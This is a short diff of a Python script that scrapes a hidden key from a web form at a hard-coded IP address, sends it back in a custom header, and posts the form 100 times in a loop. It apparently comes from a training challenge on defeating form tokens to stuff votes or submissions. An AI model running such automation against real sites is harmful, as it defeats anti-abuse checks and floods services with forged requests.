@@ -9,11 +9,11 @@ url = "http://158.69.76.135/level1.php"
 site = requests.get(url)
 # scrape the site for its key
 soup = BeautifulSoup(site.text, 'html.parser')
-secret = soup.find('input', attrs={'name':'key'})
-new_cookie = secret['value']
+secret = soup.find('input', attrs={'name':'key'})['value']
+#print(secret)
 
 # create and append our header
-headers = {'HoldTheDoor': new_cookie}
-payload.update({'key': new_cookie})
-r = requests.post(url, params=payload, headers=headers)
-print(r.status_code)
+headers = {'HoldTheDoor': secret}
+#payload.update({'key': new_cookie})
+for i in range(100):
+    r = requests.post(url, data=payload, headers=headers)
